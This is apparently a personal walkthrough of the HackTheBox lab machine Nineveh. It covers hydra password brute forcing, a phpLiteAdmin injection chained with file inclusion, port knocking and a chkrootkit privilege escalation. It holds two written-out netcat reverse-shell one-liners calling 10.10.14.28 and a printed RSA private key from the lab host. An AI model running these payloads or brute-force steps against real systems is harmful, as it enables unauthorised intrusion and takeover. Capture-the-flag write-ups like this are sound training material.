# NINEVEH

admin@nineveh.htb
add in /etc/hosts nineveh.htb

```
dirb http://nineveh.htb/ /usr/share/wordlists/dirb/big.txt
dirb https://nineveh.htb/ /usr/share/wordlists/dirb/big.txt
```

found 
- http://nineveh.htb/department/login.php
- https://nineveh.htb/db/

on http the comment says 
<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->
so we have a user and a hint 

when invalid user says 
- invalid username

when valid username (like admin)
- Invalid Password!

so we can brute force
feeling bored to use tools lets create my own little brute forcer
as we know we ca say if user exist or not so we know that admin is a valid user lets brute force him 
```
python myforcer.py /usr/share/wordlists/rockyou.txt
Valid ! 1q2w3e4r5t
```
on url 
```
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt
```
(Notes button) we have a note 
```
- Have you fixed the login page yet! hardcoded username and password is really bad idea!
- check your serect folder to get in! figure it out! this is your challenge
Improve the db interface.
~amrois
```
if we play a little with the url 
```
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.php
```
gives us a weird error message:
```
Warning:  include(files/ninevehNotes.php): failed to open stream: No such file or directory in /var/www/html/department/manage.php on line 31
Warning:  include(): Failed opening 'files/ninevehNotes.php' for inclusion (include_path='.:/usr/share/php') in /var/www/html/department/manage.php on line 31
```

well cant find anything atm lets see https/db
try to bruteforce with hydra this time 

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64
```
we have this password
[443][http-post-form] host: nineveh.htb   login: admin   password: password123

there is a phpLiteAdmin v1.9  lets google if we can find some exploits
```
https://www.exploit-db.com/exploits/24044
```

- create a database named "ninevehNotes.txt.exploit.php" 
- also create a table in this database named wathever with just one field, this is where we are gonna exploit 
- in the default value put the code 

from now we should be able to see this in the server somewhere 

important note we can see the path of the database file 
```
Path to database: /var/tmp/ninevehNotes.txt.exploit.php
```

after a lot of trying 
we can see the result of my nphpinfo in 
```
http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes.txt.exploit.php
```
now we know that php is working in here lets get a reverse shell
after a lot of trying finally got it (reverse shells / webshells doesnt work idk why)
```
POST /department/manage.php?notes=/var/tmp/ninevehNotes.txt.exploit.php HTTP/1.1
Host: nineveh.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=kf3kpuucka8icfirv0lc1a2bb6
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

cmd=rm+-f+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.28+4444+>/tmp/f
```

now we have a shell i remember that the first note was saying go check the secure note 
there is an image here 
if i strings it i can find a rsa private key is this for a ssh connexion ? 

we check if ssh is open as we cant see it from outside 
```
netstat -tulpn | grep LISTEN
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

it is open so we get the file 
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
```
put it in /tmp/id_rsa 
chmod 600 id_rsa 
and we can 
```
ssh -i test amrois@nineveh.htb
```
and we are amrois 
from here we can see from linpeas 
```
/usr/bin/crontab 
*/10 * * * * /usr/sbin/report-reset.sh
```
```
amrois@nineveh:/tmp$ ls -la /usr/sbin/report-reset.sh
-rwxr-x--- 1 amrois amrois 34 Jul  2  2017 /usr/sbin/report-reset.sh
```
```
amrois@nineveh:/tmp$ cat /usr/sbin/report-reset.sh
#!/bin/bash

rm -rf /report/*.txt
```
i guess we can inject something here
cant sudo -l we dont have password 

checking linpeas i can see 
```
╔══════════╣ Analyzing Knockd Files (limit 70)
```
after googeling i can see this is "port knocking" so it appears that i can open ports by knocking at some other ports lets see how it work
```
amrois@nineveh:~$ cat /etc/default/knockd 
################################################
#
# knockd's default file, for generic sys config
#
################################################

# control if we start knockd at init or not
# 1 = start
# anything else = don't start
#
# PLEASE EDIT /etc/knockd.conf BEFORE ENABLING
START_KNOCKD=1

# command line options
KNOCKD_OPTS="-i ens160"
amrois@nineveh:~$ cat /etc/knockd.conf 
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

```

here we can see that if we "knock" at port 571, 290, 911 we can open port 22 and therefore ssh 
```
for i in 571 290 911; do nmap -Pn -p $i --host-timeout 201 --max-retries 0 10.10.10.43; done 
```
```
nmap -p 22 10.10.10.43 
Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
```
 
damn thats cool !!

so here we have a ssh shell lets go back to the /usr/sbin/report-reset.sh

a lot a search finnally found that the files in /report/ are made by chkrootkit found a local privilege escalation exploit 
```
https://www.exploit-db.com/exploits/33899
```

so create a /tmp/update file 
```
#!/bin/bash

rm -f /tmp/shell;mkfifo /tmp/shell;cat /tmp/shell|/bin/sh -i 2>&1|nc 10.10.14.28 4242 >/tmp/shell
```
and make it executable 
```
chmod +x /tmp/update
```

we wait with a listenner 
and we are root

